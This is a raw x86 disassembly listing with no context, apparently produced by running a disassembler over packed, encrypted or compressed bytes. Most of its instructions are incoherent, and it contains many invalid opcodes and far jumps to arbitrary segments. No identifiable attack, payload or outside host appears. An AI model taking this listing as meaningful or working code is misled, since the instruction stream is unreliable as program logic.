  4111ab:	idiv   BYTE PTR [ecx-0x63]
  4111ae:	lea    esp,[esi-0x72]
  4111b1:	test   eax,0xe062c0ac
  4111b6:	test   al,0xae
  4111b8:	xchg   edx,eax
  4111b9:	sbb    ebx,ecx
  4111bb:	dec    edx
  4111bc:	inc    eax
  4111bd:	(bad)  
  4111be:	std    
  4111bf:	mov    ah,0x13
  4111c1:	xor    eax,0xb55f2cc4
  4111c6:	sub    dl,BYTE PTR [ebp+0x555e63a8]
  4111cc:	arpl   WORD PTR [ebx+0x6374eed4],cx
  4111d2:	adc    al,0x69
  4111d4:	lods   eax,DWORD PTR ds:[esi]
  4111d5:	mov    ds:0x7498e727,al
  4111da:	inc    eax
  4111db:	add    eax,0x611d4f37
  4111e0:	iret   
  4111e1:	or     edx,ebp
  4111e3:	pushf  
  4111e4:	sbb    BYTE PTR [ebx],bl
  4111e6:	inc    eax
  4111e7:	push   ecx
  4111e8:	les    ebx,FWORD PTR [edx]
  4111ea:	aaa    
  4111eb:	and    BYTE PTR [edx+0x5e],al
  4111ee:	mov    ds:0xf2113d5c,eax
  4111f3:	dec    edx
  4111f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111f5:	ds and al,0x8
  4111f8:	cld    
  4111f9:	addr16 (bad) 
  4111fb:	fcmovnu st,st(5)
  4111fd:	outs   dx,DWORD PTR ds:[esi]
  4111fe:	mov    DWORD PTR [ecx],esp
  411200:	stc    
  411201:	enter  0x1d25,0xb9
  411205:	(bad)  
  411206:	push   0x89c2effc
  41120b:	es jle 0x4111a3
  41120e:	pop    eax
  41120f:	add    al,0xe4
  411211:	sbb    al,0x63
  411213:	lods   al,BYTE PTR ds:[esi]
  411214:	mov    cl,BYTE PTR [edi+ebx*4-0x7c]
  411218:	inc    ecx
  411219:	or     al,0xf7
  41121b:	push   ebx
  41121c:	cmc    
  41121d:	loope  0x411215
  41121f:	inc    ecx
  411220:	data16 loope 0x411249
  411223:	pop    ds
  411224:	fs mov edx,0xbc0bc1b6
  41122a:	outs   dx,BYTE PTR ds:[esi]
  41122b:	pop    edx
  41122c:	(bad)  
  41122e:	test   BYTE PTR [esi-0xd1bb0fc],0x72
  411235:	mov    eax,0x9d65a6b8
  41123a:	rcl    DWORD PTR ds:0x898df9a,1
  411240:	adc    esi,DWORD PTR [esi+0x3a]
  411243:	outs   dx,DWORD PTR ds:[esi]
  411244:	push   0xffffffb7
  411246:	dec    esp
  411247:	(bad)  
  411249:	sti    
  41124a:	sub    BYTE PTR [ebx],0x6d
  41124d:	pop    esp
  41124e:	mov    BYTE PTR [edx+0x15b590c1],dh
  411254:	jg     0x411249
  411256:	enter  0x48,0x50
  41125a:	ja     0x411278
  41125c:	mov    esp,0x7531abec
  411261:	clc    
  411262:	out    dx,eax
  411263:	inc    esp
  411264:	call   ebx
  411266:	or     DWORD PTR ds:0xa5211590,ebx
  41126c:	mov    bl,0xa0
  41126e:	scas   al,BYTE PTR es:[edi]
  41126f:	sbb    edx,DWORD PTR [edi-0x5c]
  411272:	cmp    dh,BYTE PTR ds:0xcb3d2cd8
  411278:	sub    al,0x5d
  41127a:	retf   
  41127b:	scas   eax,DWORD PTR es:[edi]
  41127c:	in     al,dx
  41127d:	push   cs
  41127e:	rcl    DWORD PTR [ecx+0x48],1
  411281:	(bad)  
  411282:	add    BYTE PTR [esi],dl
  411284:	pop    ss
  411285:	(bad)  
  411286:	push   cs
  411287:	call   esi
  411289:	ret    0x8be0
  41128c:	jb     0x4112c8
  41128e:	xor    DWORD PTR [ebx-0x53e2f34e],esp
  411294:	frstor [edi]
  411296:	dec    esp
  411297:	retf   0xe521
  41129a:	xor    DWORD PTR [esi],esi
  41129c:	lahf   
  41129d:	push   0x2a
  41129f:	cmp    al,0x4d
  4112a1:	jmp    0xfcbe:0x61a579ef
  4112a8:	push   edi
  4112a9:	mov    eax,cs:0x316a42e5
  4112af:	repz pop ds
  4112b1:	xor    ah,dh
  4112b3:	rep stos DWORD PTR es:[edi],eax
  4112b5:	pop    ecx
  4112b6:	fstp   QWORD PTR [edi+0x2b16f28e]
  4112bc:	xor    BYTE PTR [ecx],ah
  4112be:	or     ch,BYTE PTR [eax+0x71]
  4112c1:	icebp  
  4112c2:	imul   bl
  4112c4:	and    bh,BYTE PTR [bx+di-0x62f9]
  4112c9:	jg     0x4112e1
  4112cb:	dec    esp
  4112cc:	or     ebp,DWORD PTR cs:[ebx+0x78949586]
  4112d3:	push   ss
  4112d4:	adc    eax,0xb9a92fbe
  4112d9:	push   ds
  4112da:	dec    ebp
  4112db:	mov    ebp,0x122742f
  4112e0:	je     0x411347
  4112e2:	jo     0x411308
  4112e4:	je     0x4112de
  4112e6:	nop
  4112e7:	jmp    0x96a8:0x6ae9125e
  4112ee:	int3   
  4112ef:	les    ecx,FWORD PTR [ebp-0x30]
  4112f2:	push   ecx
  4112f3:	test   BYTE PTR [esi-0x4b],bh
  4112f6:	push   0xffffff8f
  4112f8:	add    BYTE PTR [edi-0x3],dh
  4112fb:	xor    BYTE PTR [esi],bh
  4112fd:	mov    al,ds:0xb4e94c4d
  411302:	inc    esi
  411303:	pushf  
  411304:	inc    esi
  411305:	mov    al,ds:0xe39e9a27
  41130a:	pop    esp
  41130b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130c:	test   al,0x96
  41130e:	and    DWORD PTR [edi],ebp
  411310:	ds dec edi
  411312:	clc    
  411313:	test   al,0x91
  411315:	loop   0x4112be
  411317:	add    eax,0x3fafcf3d
  41131c:	into   
  41131d:	sub    ecx,ecx
  41131f:	lods   al,BYTE PTR ds:[esi]
  411320:	gs int 0xf4
  411323:	lds    ebx,FWORD PTR [ebx+ebp*1-0xb]
  411327:	(bad)  
  411328:	mul    DWORD PTR [ecx]
  41132a:	out    dx,al
  41132b:	xchg   edi,eax
  41132c:	mov    ebx,0x889d49fc
  411331:	std    
  411332:	les    esi,FWORD PTR [ebx-0x28b6d48d]
  411338:	jmp    0x4112d0
  41133a:	fadd   st(0),st
  41133c:	test   edx,ebx
  41133e:	dec    edx
  41133f:	and    DWORD PTR [ebp+0x2c1486e7],ebx
  411345:	lahf   
  411346:	push   cs
  411347:	ror    BYTE PTR [esi-0x793e3fcf],1
  41134d:	in     eax,0x56
  41134f:	imul   ecx,DWORD PTR [ebx+0x80d8b87],0x1d111c97
  411359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41135a:	inc    ecx
  41135b:	xor    dh,ch
  41135d:	popf   
  41135e:	cmp    esi,edx
  411360:	repnz (bad) 
  411362:	das    
  411363:	popf   
  411364:	daa    
  411365:	out    0x15,al
  411367:	sbb    dh,BYTE PTR [edx+0x6]
  41136a:	ja     0x411334
  41136c:	ins    DWORD PTR es:[edi],dx
  41136d:	enter  0xaf57,0xc8
  411371:	test   DWORD PTR [edx-0x4d],0xd74954eb
  411378:	jmp    0x1d43:0x3f39b25e
  41137f:	loop   0x4113a0
  411381:	inc    ebp
  411382:	adc    ah,dh
  411384:	mov    ds:0xa3860a3a,eax
  411389:	int    0x3e
  41138b:	sub    DWORD PTR [esi+edx*1],0x34e5cc19
  411392:	div    BYTE PTR [esi+0x71a876cb]
  411398:	call   FWORD PTR [eax+0x5616535b]
  41139e:	adc    BYTE PTR [eax-0x64f63a48],bh
  4113a4:	mov    al,ds:0xa8c88956
  4113a9:	imul   ecx,DWORD PTR [ecx],0x81238d6b
  4113af:	imul   edx,DWORD PTR [esi-0x44],0xefee2eae
  4113b6:	lods   al,BYTE PTR ds:[esi]
  4113b7:	retf   
  4113b8:	loopne 0x41142f
  4113ba:	cmp    esi,edx
  4113bc:	gs push esp
  4113be:	push   ebp
  4113bf:	int3   
  4113c0:	xor    DWORD PTR [esi+ebp*8-0x7b],ecx
  4113c4:	stc    
  4113c5:	mov    ch,0x8b
  4113c7:	ds mov dl,0xb5
  4113ca:	sbb    BYTE PTR [ecx],ah
  4113cc:	out    0xd9,eax
  4113ce:	push   ecx
  4113cf:	xlat   BYTE PTR ds:[ebx]
  4113d0:	out    0xe6,al
  4113d2:	pop    esi
  4113d3:	outs   dx,DWORD PTR ds:[esi]
  4113d4:	ja     0x411445
  4113d6:	cmp    al,0x79
  4113d8:	sbb    ch,BYTE PTR [ebp+0x41]
  4113db:	xchg   edx,eax
  4113dc:	dec    ebp
  4113dd:	mov    edi,0xb391deb
  4113e2:	jne    0x411407
  4113e4:	sub    ecx,eax
  4113e6:	pop    ebx
  4113e7:	sbb    edx,DWORD PTR [edx-0x61]
  4113ea:	mov    eax,0x2c68e120
  4113ef:	and    BYTE PTR ds:0x7a4e90b,bl
  4113f5:	(bad)  
  4113f6:	and    al,0x31
  4113f8:	pop    eax
  4113f9:	xchg   ebx,eax
  4113fa:	out    dx,eax
  4113fb:	fist   DWORD PTR [edi+0x29f9ff69]
  411401:	ins    DWORD PTR es:[edi],dx
  411402:	std    
  411403:	int3   
  411404:	out    dx,eax
  411405:	cmc    
  411406:	shl    dh,0xb2
  411409:	popa   
  41140a:	fwait
  41140b:	mov    BYTE PTR [eax+0x40],ch
  41140e:	push   esp
  41140f:	test   BYTE PTR [edi],bh
  411411:	(bad)  
  411412:	out    dx,eax
  411413:	mov    bh,0x2e
  411415:	sub    eax,0x6ae803fd
  41141a:	pushf  
  41141b:	adc    al,0x6
  41141d:	inc    edx
  41141f:	idiv   DWORD PTR [eax]
  411421:	imul   edi,DWORD PTR [esi],0x57
  411424:	sbb    al,BYTE PTR [edx+0x1d55ed50]
  41142a:	inc    ecx
  41142b:	cmc    
  41142c:	mov    eax,0x9df6b17
  411431:	adc    al,0x2b
  411433:	ret    
  411434:	jmp    0xa1071823
  411439:	das    
  41143a:	cmp    al,0x33
  41143c:	ins    BYTE PTR es:[edi],dx
  41143d:	xchg   esp,eax
  41143e:	dec    eax
  41143f:	out    0xa6,eax
  411441:	iret   
  411442:	mov    WORD PTR [edx+eax*2+0x3187b530],?
  411449:	sbb    ecx,DWORD PTR [ebx-0x57b03720]
  41144f:	mov    dl,0xcc
  411451:	into   
  411452:	inc    esp
  411453:	into   
  411454:	pop    ebp
  411455:	xchg   esi,eax
  411456:	call   0x5ced:0x51e4e9fb
  41145d:	add    edx,esi
  41145f:	ficom  DWORD PTR [eax+0x27]
  411462:	dec    esi
  411463:	adc    eax,0x55f4714a
  411468:	fsubrp st(7),st
  41146a:	test   eax,0xbfb0bc5d
  41146f:	mov    al,ds:0xedd43d9d
  411474:	push   ecx
  411475:	jb     0x4114ac
  411477:	push   0x35
  411479:	inc    ecx
  41147a:	iret   
  41147b:	hlt    
  41147c:	std    
  41147d:	mov    esp,0x1b62ac0
  411482:	jmp    0x41143d
  411484:	icebp  
  411485:	push   ss
  411486:	test   BYTE PTR [esi+0x1f],ah
  411489:	ret    0x906c
  41148c:	inc    eax
  41148d:	sub    ecx,DWORD PTR [edx+0x27494037]
  411493:	or     DWORD PTR [ecx+0x6ae8f536],ebp
  411499:	push   0x4c50dfd3
  41149e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41149f:	loop   0x41149a
  4114a1:	jo     0x4114d4
  4114a3:	push   es
  4114a4:	outs   dx,DWORD PTR ds:[esi]
  4114a5:	fst    DWORD PTR [ecx-0x5b]
  4114a8:	push   esi
  4114a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114aa:	lods   al,BYTE PTR ds:[esi]
  4114ab:	inc    edi
  4114ac:	dec    edi
  4114ad:	sub    eax,ebp
  4114af:	push   0x680feda1
  4114b4:	and    bl,BYTE PTR [esp+eax*4+0x23cf5bd1]
  4114bb:	xor    eax,DWORD PTR [eax-0x5b]
  4114be:	or     ah,0xc3
  4114c1:	cmp    ch,BYTE PTR [ecx+0x55]
  4114c4:	(bad)  
  4114c6:	mov    esp,0xf605ea86
  4114cb:	mov    ch,BYTE PTR [esi-0x517edced]
  4114d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d2:	push   ecx
  4114d3:	popa   
  4114d4:	pop    edi
  4114d5:	inc    edi
  4114d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114d8:	and    DWORD PTR [esi-0x37],edx
  4114db:	ja     0x4114e6
  4114dd:	mov    cl,0x56
  4114df:	sub    al,ch
  4114e1:	jbe    0x4114be
  4114e3:	mov    ds:0x52021020,al
  4114e8:	mov    al,BYTE PTR [esi+eiz*8-0x4b0a1f50]
  4114ef:	data16 hlt 
  4114f1:	mov    al,ds:0xba6e2a8f
  4114f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f7:	sub    eax,0x7aff6a0a
  4114fc:	lahf   
  4114fd:	dec    ebp
  4114fe:	enter  0x383a,0xbc
  411502:	scas   eax,DWORD PTR es:[edi]
  411503:	stos   BYTE PTR es:[edi],al
  411504:	ja     0x4114bf
  411506:	or     dh,bl
  411508:	xchg   BYTE PTR [esi-0x7d85aad],al
  41150e:	and    BYTE PTR [edx+0x29bdb50d],ah
  411514:	jno    0x41158e
  411516:	jge    0x4114c3
  411518:	xchg   esi,eax
  411519:	hlt    
  41151a:	mov    dl,0xd2
  41151c:	adc    edx,edx
  41151e:	or     dl,0x8f
  411521:	imul   eax,DWORD PTR [ebx],0xf117ef2b
  411527:	sbb    al,0x46
  411529:	shl    ebp,cl
  41152b:	pop    ss
  41152c:	iret   
  41152d:	jns    0x41150b
  41152f:	xchg   ebx,eax
  411530:	mov    ebp,0x4607271
  411535:	pop    edx
  411536:	repnz xchg esi,eax
  411538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411539:	adc    ecx,DWORD PTR [ecx]
  41153b:	lahf   
  41153c:	jp     0x4114d7
  41153e:	gs add bh,dl
  411541:	and    ebp,DWORD PTR [edi]
  411543:	fisttp QWORD PTR [esi+0x6d239691]
  411549:	adc    al,0x3e
  41154b:	cmp    DWORD PTR [edx+0xd206f2d],ebp
  411551:	test   eax,0x43aa3ab
  411556:	or     bh,BYTE PTR [eax+edx*2-0x57]
  41155a:	xchg   esi,eax
  41155b:	xchg   esi,esp
  41155d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41155e:	push   es
  41155f:	push   cs
  411560:	xlat   BYTE PTR ds:[ebx]
  411561:	fst    st(6)
  411563:	xchg   edx,eax
  411564:	out    dx,eax
  411565:	push   cs
  411566:	into   
  411567:	push   ecx
  411568:	mov    eax,0xace9127f
  41156d:	pop    ebp
  41156e:	stos   BYTE PTR es:[edi],al
  41156f:	nop
  411570:	std    
  411571:	or     eax,DWORD PTR [ecx+edi*2]
  411574:	mov    WORD PTR [edi],ds
  411576:	sahf   
  411577:	out    dx,al
  411578:	stos   DWORD PTR es:[edi],eax
  411579:	or     DWORD PTR [edi-0x2e],ebx
  41157c:	lods   al,BYTE PTR ds:[esi]
  41157d:	cmp    dh,BYTE PTR [ecx+ebx*4+0x495cc6c7]
  411584:	mov    al,ds:0x7bf99f71
  411589:	inc    eax
  41158a:	jl     0x41159a
  41158c:	mov    al,ds:0xbdb2672b
  411591:	mov    ds:0xc34a6a7e,eax
  411596:	pop    es
  411597:	add    ecx,DWORD PTR [edx+0x52c24d37]
  41159d:	mov    esp,0xec9fe951
  4115a2:	arpl   WORD PTR [ecx+edx*1+0x73],dx
  4115a6:	neg    BYTE PTR [esi-0x4d0d8629]
  4115ac:	inc    ecx
  4115ad:	stos   BYTE PTR es:[edi],al
  4115ae:	add    eax,0xc8f8a836
  4115b3:	jmp    0xeea7:0xe5863fe8
  4115ba:	sbb    eax,0x2f60788f
  4115bf:	sbb    DWORD PTR [ecx-0x6b2ad8b],0x7f050b9f
  4115c9:	mov    ebp,ebp
  4115cb:	add    eax,0x4510efd5
  4115d0:	data16 fstp TBYTE PTR [esi+esi*4]
  4115d4:	fstp   TBYTE PTR [edx-0x3ffe8a09]
  4115da:	or     eax,0x2ab1605c
  4115df:	stos   BYTE PTR es:[edi],al
  4115e0:	adc    bl,bl
  4115e2:	popf   
  4115e3:	lock mov cx,0xc80a
  4115e8:	fcomp  QWORD PTR [ebp+0x22]
  4115eb:	retf   
  4115ec:	bound  edi,QWORD PTR [edx-0xd551ce2]
  4115f2:	les    ebp,FWORD PTR [esi+0x31]
  4115f5:	pop    ds
  4115f6:	pop    eax
  4115f7:	cs popa 
  4115f9:	(bad)  
  4115fa:	call   0x9dda:0xfb085c17
  411601:	test   DWORD PTR [ebx-0x370af534],esi
  411607:	outs   dx,BYTE PTR ds:[esi]
  411608:	pop    esp
  411609:	cmp    BYTE PTR [esi-0x60],0x17
  41160d:	in     eax,0x72
  41160f:	call   0x81fa:0x5a1e3826
  411616:	in     al,dx
  411617:	dec    esi
  411618:	es loopne 0x41161d
  41161b:	add    al,0x5
  41161d:	stos   DWORD PTR es:[edi],eax
  41161e:	leave  
  41161f:	sbb    edi,DWORD PTR [edx+0x22]
  411622:	shl    dh,cl
  411624:	push   ss
  411625:	out    0xb4,eax
  411627:	sub    bh,BYTE PTR [ecx+ecx*4-0x34]
  41162b:	out    dx,al
  41162c:	psubw  mm3,mm7
  41162f:	pop    esi
  411630:	jnp    0x411639
  411632:	out    dx,eax
  411633:	sbb    ah,BYTE PTR [edx]
  411635:	mov    DWORD PTR [eax+0x42],ebp
  411638:	clc    
  411639:	add    eax,0x45f651c6
  41163e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41163f:	in     eax,dx
  411640:	(bad)
  411644:	mov    ebp,0xf74ea2bc
  411649:	pushf  
  41164a:	and    DWORD PTR [ebp+0x23],0xffffff9d
  41164e:	jns    0x411698
  411650:	jl     0x41169b
  411652:	inc    eax
  411653:	xlat   BYTE PTR ds:[ebx]
  411654:	call   0xece4:0xe1dedfe3
  41165b:	mov    al,ds:0x1c46d9bd
  411660:	pop    ss
  411661:	fcmovnbe st,st(2)
  411663:	mov    edx,0x2fdf95ef
  411668:	add    al,cl
  41166a:	shl    al,1
  41166c:	add    al,BYTE PTR [eax]
  41166e:	xor    ch,BYTE PTR [edi-0x13]
  411671:	ins    DWORD PTR es:[edi],dx
  411672:	rol    eax,0x24
  411675:	aas    
  411676:	jne    0x41169f
  411678:	pop    ebp
  411679:	rol    BYTE PTR [ebp+edi*4-0x2b],0x25
  41167e:	pop    ebx
  41167f:	outs   dx,BYTE PTR ds:[esi]
  411680:	jmp    0x7d2d:0x87d64fc9
  411687:	ds popa 
  411689:	xor    al,0x72
  41168b:	push   ebp
  41168c:	(bad)  
  41168d:	pop    ebp
  41168e:	shl    DWORD PTR [ecx-0x3be3f0ed],0x5b
  411695:	pop    edi
  411696:	mov    ds:0x4138d41b,eax
  41169b:	jns    0x41163c
  41169d:	std    
  41169e:	pop    ss
  41169f:	cs push edi
  4116a1:	and    al,0x9
  4116a3:	mov    dl,0x60
  4116a5:	cld    
  4116a6:	dec    ebx
  4116a7:	scas   al,BYTE PTR es:[edi]
  4116a8:	adc    al,0x49
  4116aa:	pop    esi
  4116ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ac:	fistp  QWORD PTR [eax]
  4116ae:	or     al,BYTE PTR [ecx]
  4116b0:	retf   
  4116b1:	into   
  4116b2:	add    DWORD PTR [edi-0x51],ecx
  4116b5:	sub    eax,DWORD PTR ds:0x7e7f2a3c
  4116bb:	std    
  4116bc:	dec    eax
  4116bd:	push   0x49
  4116bf:	sub    cl,BYTE PTR ds:0xdda46791
  4116c5:	leave  
  4116c6:	lods   eax,DWORD PTR ds:[esi]
  4116c7:	sbb    BYTE PTR [ebx],0x78
  4116ca:	adc    eax,0xb248abc8
  4116cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d0:	popa   
  4116d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d2:	add    edx,esi
  4116d4:	call   0xd565:0x7c2b119d
  4116db:	add    eax,0x2e724b6f
  4116e0:	cmp    DWORD PTR [eax],ecx
  4116e2:	jo     0x41166b
  4116e4:	push   ss
  4116e5:	pop    ecx
  4116e6:	addr16 and al,0xc0
  4116e9:	and    DWORD PTR [ebx-0x24],edx
  4116ec:	int    0x87
  4116ee:	mov    eax,0xbac60a72
  4116f3:	jo     0x411699
  4116f5:	add    BYTE PTR [ebx-0xd],0x32
  4116f9:	pop    eax
  4116fa:	fldln2 
  4116fc:	xchg   edi,eax
  4116fd:	cmp    al,0xc6
  4116ff:	dec    ebp
  411700:	pusha  
  411701:	mov    edx,0xb56ea50a
  411706:	scas   eax,DWORD PTR es:[edi]
  411707:	lahf   
  411708:	mov    edi,fs
  41170a:	out    0xb9,al
  41170c:	add    esi,DWORD PTR [ebx+0x3b]
  41170f:	jne    0x411790
  411711:	mov    ss,WORD PTR [ebx+0xb]
  411714:	sti    
  411715:	dec    ebx
  411716:	aaa    
  411717:	pop    ss
  411718:	sub    eax,0xceb3336e
  41171d:	and    BYTE PTR [ecx-0x6c5f15af],bl
  411723:	aad    0x6a
  411725:	fbld   TBYTE PTR [ecx+0x5e]
  411728:	ins    BYTE PTR es:[edi],dx
  411729:	adc    BYTE PTR [ecx+0x228cd5fc],dl
  41172f:	push   0xffffffa1
  411731:	adc    ebp,esp
  411733:	imul   edi,edi,0xffffff83
  411736:	jmp    0x64803cfa
  41173b:	or     BYTE PTR ds:0x5423d013,bl
  411741:	jbe    0x4117bc
  411743:	mov    WORD PTR gs:[edx+0x10352833],?
  41174a:	ret    0xe7bc
  41174d:	into   
  41174e:	in     eax,dx
  41174f:	cld    
  411750:	repz push cs
  411752:	push   0xffffffa2
  411754:	fdivr  st,st(6)
  411756:	inc    edi
  411757:	fistp  DWORD PTR [esp+eax*4-0x6edbbf1]
  41175e:	(bad)  
  41175f:	mov    ebp,0xf237cd3c
  411764:	jmp    0x7627:0x1247b0eb
  41176b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176c:	mov    cl,0x5b
  41176e:	xor    BYTE PTR [edx],dl
  411770:	ds dec ebx
  411772:	sub    ecx,DWORD PTR [ebp-0x3481897d]
  411778:	adc    esp,DWORD PTR [ebp+0x21]
  41177b:	mov    edx,0x2accaf13
  411780:	imul   ebx,DWORD PTR [ecx+0x2288fb79],0x1dbcb6a
  41178a:	lahf   
  41178b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41178c:	dec    esi
  41178d:	(bad)  [ebp-0x3d]
  411790:	idiv   DWORD PTR [eax+0x3c574b23]
  411796:	mov    BYTE PTR [eax],0x96
  411799:	aas    
  41179a:	add    eax,0x26c9c09c
  41179f:	inc    edi
  4117a0:	add    ch,BYTE PTR [edx]
  4117a2:	or     al,0xcb
  4117a4:	add    al,0x2c
  4117a6:	in     eax,dx
  4117a7:	dec    esi
  4117a8:	sbb    eax,0x14c0ab95
  4117ad:	jmp    0x4117ee
  4117af:	ret    
  4117b0:	popf   
  4117b1:	adc    BYTE PTR [eax],dh
  4117b3:	rcr    BYTE PTR ds:0xc3ffae40,1
  4117b9:	or     cl,BYTE PTR [eax+0x72921bd4]
  4117bf:	adc    BYTE PTR [ebx-0x75bcfa7e],bl
  4117c5:	int3   
  4117c6:	push   0x9
  4117c8:	mov    esi,eax
  4117ca:	lea    edx,[ecx-0x36]
  4117cd:	inc    ecx
  4117ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117cf:	daa    
  4117d0:	dec    ecx
  4117d1:	mov    ds:0x8ec8b22f,al
  4117d6:	ficom  WORD PTR [edi-0x43]
  4117d9:	xor    al,0x7b
  4117db:	xchg   edi,eax
  4117dc:	mov    al,0x70
  4117de:	mov    esi,0x4d9e041a
  4117e3:	sbb    bl,cl
  4117e5:	pop    ecx
  4117e6:	fnstcw WORD PTR [ebp+0x5b0e8cdd]
  4117ec:	cwde   
  4117ed:	xchg   ebx,eax
  4117ee:	sbb    BYTE PTR [ebp+0x6c],dh
  4117f1:	mov    eax,ds:0x517cf18b
  4117f6:	out    dx,eax
  4117f7:	mov    bl,0x9
  4117f9:	add    eax,eax
  4117fb:	dec    esp
  4117fc:	ret    
  4117fd:	cmp    eax,0x7a2f5270
  411802:	sbb    BYTE PTR [esp+edx*1+0x7a],bh
  411806:	enter  0x4f2c,0x40
  41180a:	das    
  41180b:	outs   dx,BYTE PTR ds:[esi]
  41180c:	loope  0x41179a
  41180e:	rcr    eax,cl
  411810:	out    0xe4,al
  411812:	loope  0x4117d8
  411814:	test   al,0x26
  411816:	xor    DWORD PTR [ecx-0x3e32a9c8],edx
  41181c:	mov    edx,0xdb935174
  411821:	test   BYTE PTR [eax-0x13e6dab3],bh
  411827:	mov    DWORD PTR [eax],ecx
  411829:	mov    eax,0xa1914c5f
  41182e:	pop    edx
  41182f:	pushf  
  411830:	adc    esp,esi
  411832:	arpl   cx,bp
  411834:	aas    
  411835:	mov    ah,0x48
  411837:	bound  edi,QWORD PTR [esi+0xc326734]
  41183d:	push   ebx
  41183e:	dec    edx
  41183f:	jno    0x411868
  411841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411842:	ds enter 0x9266,0x51
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x27ffba54
  411868:	fidivr WORD PTR [eax-0xc]
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx-0x65]
  411873:	jmp    0x41181a
  411875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411876:	push   ss
  411877:	mov    bh,0x44
  411879:	mov    BYTE PTR [ebx-0x3d],dh
  41187c:	sub    DWORD PTR [esi-0x1a],esp
  41187f:	movd   mm0,DWORD PTR [edx-0x3f]
  411883:	pop    edx
  411884:	xchg   ebx,eax
  411885:	mov    BYTE PTR [esi],0x44
  411888:	bound  edi,QWORD PTR [eax-0x21]
  41188b:	mov    bh,BYTE PTR [esi+0x7b]
  41188e:	(bad)  
  41188f:	xchg   ecx,eax
  411890:	shl    bl,1
  411892:	into   
  411893:	push   ds
  411894:	rcr    BYTE PTR [ebx+0x4f5e1af3],cl
  41189a:	cs jg  0x4118ac
  41189d:	mov    ecx,0xfe68b75
  4118a2:	mov    esp,0xb8a686f5
  4118a7:	jp     0x411920
  4118a9:	dec    edi
  4118aa:	xchg   ecx,eax
  4118ab:	or     ah,BYTE PTR [edx-0x1ef00994]
  4118b1:	sahf   
  4118b2:	aas    
  4118b3:	leave  
  4118b4:	adc    eax,DWORD PTR [esi+eax*1-0x15]
  4118b8:	mov    al,0x87
  4118ba:	add    edi,ecx
  4118bc:	dec    esp
  4118bd:	fidiv  WORD PTR [edx+0x7b8c721f]
  4118c3:	stos   BYTE PTR es:[edi],al
  4118c4:	jmp    FWORD PTR [ecx+0x37f9df6b]
  4118ca:	(bad)  
  4118cb:	jne    0x41190d
  4118cd:	xor    ch,BYTE PTR ds:0x220c6e02
  4118d3:	outs   dx,DWORD PTR ds:[esi]
  4118d4:	xlat   BYTE PTR ds:[ebx]
  4118d5:	xchg   ecx,eax
  4118d6:	inc    ebp
  4118d7:	or     eax,0xedb688a3
  4118dc:	aaa    
  4118dd:	repz std 
  4118df:	(bad)  
  4118e0:	mov    esp,0xca7e3d5a
  4118e5:	mov    ah,0x49
  4118e7:	shr    BYTE PTR [esi-0x1315c7b6],0x10
  4118ee:	sub    esi,DWORD PTR [edx]
  4118f0:	retf   0x10c8
  4118f3:	shr    ah,1
  4118f5:	jp     0x4118ab
  4118f7:	push   edi
  4118f8:	dec    eax
  4118f9:	js     0x411924
  4118fb:	aad    0x73
  4118fd:	into   
  4118fe:	daa    
  4118ff:	sar    DWORD PTR [ecx*2+0x20ede2d5],1
  411906:	push   ds
  411907:	pusha  
  411908:	xchg   esi,eax
  411909:	mov    bl,0x65
  41190b:	jp     0x4118ea
  41190d:	mov    cl,0xb2
  41190f:	mov    ds:0x551d1616,eax
  411914:	inc    esi
  411915:	mov    esi,0xe6bd1265
  41191a:	in     eax,dx
  41191b:	pop    eax
  41191c:	in     eax,0xc1
  41191e:	jle    0x411996
  411920:	repz adc BYTE PTR ss:[eax],al
  411924:	enter  0xc769,0xc8
  411928:	test   DWORD PTR [edi-0x4a681835],edx
  41192e:	jnp    0x411917
  411930:	clc    
  411931:	push   edi
  411932:	jmp    0xb961:0x35274ae8
  411939:	xchg   DWORD PTR [ebp+0x20],ebp
  41193c:	jmp    0x4118e3
  41193e:	or     DWORD PTR [eax],ecx
  411940:	add    DWORD PTR [edi+0x35],0x54921d3e
  411947:	loopne 0x411957
  411949:	xor    edx,DWORD PTR [ecx-0x34]
  41194c:	ret    
  41194d:	or     ah,BYTE PTR [ebx+0x26]
  411950:	add    al,0x5d
  411952:	xchg   esi,eax
  411953:	mov    ebx,0xf80dbcd1
  411958:	jne    0x4118f6
  41195a:	dec    eax
  41195b:	outs   dx,BYTE PTR ds:[esi]
  41195c:	jge    0x4118fc
  41195e:	in     al,dx
  41195f:	neg    BYTE PTR [esp+ecx*8-0x611e3c92]
  411966:	mov    cl,0x2
  411968:	mov    cl,0x1f
  41196a:	pop    ds
  41196b:	push   ebp
  41196c:	and    eax,0x7442afb7
  411971:	and    al,0x74
  411973:	ds ins DWORD PTR es:[edi],dx
  411975:	ficom  DWORD PTR [ecx]
  411977:	xchg   esi,eax
  411978:	popa   
  411979:	test   BYTE PTR [ebp-0x31],ah
